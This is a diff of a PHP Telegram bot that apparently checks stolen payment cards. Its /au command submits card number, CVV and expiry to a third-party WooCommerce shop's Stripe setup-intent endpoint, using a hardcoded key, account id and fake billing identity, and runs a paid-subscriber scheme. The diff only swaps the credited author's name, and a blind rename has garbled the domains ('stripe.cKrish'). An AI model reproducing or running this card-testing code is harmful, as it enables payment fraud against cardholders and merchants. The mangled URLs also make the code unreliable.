@@ -13,8 +13,8 @@ $currentDate = date('Y-m-d');
        $expiryDate = "UNTIL DEAD"; 
     } else { 
         foreach ($paidUsers as $index => $line) {
-            list($userIdFrMANISHFile, $userExpiryDate) = explode(" ", $line);
-            if ($userIdFrMANISHFile == $userId) {
+            list($userIdFrKrishFile, $userExpiryDate) = explode(" ", $line);
+            if ($userIdFrKrishFile == $userId) {
                 if ($userExpiryDate < $currentDate) {
                     unset($paidUsers[$index]); //
                     file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
@@ -33,8 +33,8 @@ $currentDate = date('Y-m-d');
        $expiryDate = "UNTIL DEAD"; 
     } else {
         foreach ($paidUsers as $index => $line) {
-            list($userIdFrMANISHFile, $userExpiryDate) = explode(" ", $line);
-            if ($userIdFrMANISHFile == $userId) {
+            list($userIdFrKrishFile, $userExpiryDate) = explode(" ", $line);
+            if ($userIdFrKrishFile == $userId) {
                 if ($userExpiryDate < $currentDate) {
                     unset($paidUsers[$index]); 
                     file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
@@ -61,7 +61,7 @@ $text = $update["message"]["text"];
 
 //=====WHO CAN CHECK FUNC END======//
 if (preg_match('/^(\/au|\.au|!au)/', $text)) {
-    $userid = $update['message']['frMANISH']['id'];
+    $userid = $update['message']['frKrish']['id'];
 
     
 $start_time = microtime(true);
@@ -153,7 +153,7 @@ $r = "0";
 $r = rand(0, 100);
   # -------------------- [1 REQ] -------------------#
       $ch = curl_init();
-          curl_setopt($ch, CURLOPT_URL, 'https://stateaffairs.cMANISH/?wc-ajax=wc_stripe_frontend_request&elementor_page_id=8&path=/wc-stripe/v1/setup-intent');
+          curl_setopt($ch, CURLOPT_URL, 'https://stateaffairs.cKrish/?wc-ajax=wc_stripe_frontend_request&elementor_page_id=8&path=/wc-stripe/v1/setup-intent');
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -167,12 +167,12 @@ $r = rand(0, 100);
 
 
       $ch = curl_init();
-      curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.cMANISH/v1/setup_intents/'.$pi.'/confirm');
+      curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.cKrish/v1/setup_intents/'.$pi.'/confirm');
       curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
       curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-      curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Dark+Soul&payment_method_data[billing_details][address][city]=New+York+City&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=Near+Cp&payment_method_data[billing_details][address][postal_code]=10001&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][email]=dsoul1'.$mail.'2%40gmail.cMANISH&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_Dead_51HcXmvDqotq1S9R5e86L51GljOwHbcTdU7ajRRWIqiFXS650Soc0fxBCKN3oJkB6uMYwpVMtE3V5vDUMErFpspIU00PAsLtJuz&_stripe_account=acct_1HcXmvDqotq1S9R5&_stripe_version=2022-08-01&client_secret='.$client.'');
+      curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=Dark+Soul&payment_method_data[billing_details][address][city]=New+York+City&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=Near+Cp&payment_method_data[billing_details][address][postal_code]=10001&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][email]=dsoul1'.$mail.'2%40gmail.cKrish&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[payment_user_agent]=stripe.js%2F5b37d8a1b0%3B+stripe-js-v3%2F5b37d8a1b0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_Dead_51HcXmvDqotq1S9R5e86L51GljOwHbcTdU7ajRRWIqiFXS650Soc0fxBCKN3oJkB6uMYwpVMtE3V5vDUMErFpspIU00PAsLtJuz&_stripe_account=acct_1HcXmvDqotq1S9R5&_stripe_version=2022-08-01&client_secret='.$client.'');
       $result2 = curl_exec($ch);
       $msg2 = Getstr($result2,'"message": "','"');
 
@@ -198,7 +198,7 @@ $r = rand(0, 100);
 [↯] 𝗣𝗿𝗼𝘅𝘆: <code>$r.XXX.XXX.XX 🟢</code>
 [↯] 𝗨𝘀𝗲𝗿𝘀:@$username <code>[$rank]</code>
 ━━━━━━━━━━━━━━━━
-[↯] 𝗕𝗼𝘁 𝗕𝘆: <a href='t.me/MANISHOPGAMING'> MANISH </a>
+[↯] 𝗕𝗼𝘁 𝗕𝘆: <a href='t.me/KrishOPGAMING'> Krish </a>
 ━━━━━━━━━━━━━━━━
   ",
               'parse_mode'=>'html',
@@ -221,7 +221,7 @@ $r = rand(0, 100);
   ━━━━━━━━━━━━━━━━
 [↯] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲  🟢
 [↯] 𝗨𝘀𝗲𝗿𝘀:@$username <code>[$rank]</code>
-[↯] 𝗕𝗼𝘁 𝗕𝘆 ➔ <a href='t.me/MANISHOPGAMING'> MANISH
+[↯] 𝗕𝗼𝘁 𝗕𝘆 ➔ <a href='t.me/KrishOPGAMING'> Krish
   </a>━━━━━━━━━━━━━━━━
   ",
               'parse_mode'=>'html',
@@ -245,7 +245,7 @@ $r = rand(0, 100);
 [↯] 𝗧𝗶𝗺𝗲 : <code>$time seconds </code>
 [↯] 𝗣𝗿𝗼𝘅𝘆: <code>$r.XXX.XXX.XX 🟢</code>
 [↯] 𝗨𝘀𝗲𝗿𝘀:@$username <code>[$rank]</code>
-[↯] 𝗕𝗼𝘁 𝗕𝘆:<a href='t.me/MANISHOPGAMING'> MANISH </a>
+[↯] 𝗕𝗼𝘁 𝗕𝘆:<a href='t.me/KrishOPGAMING'> Krish </a>
 ━━━━━━━━━━━━━━━━
   ",
               'parse_mode'=>'html',
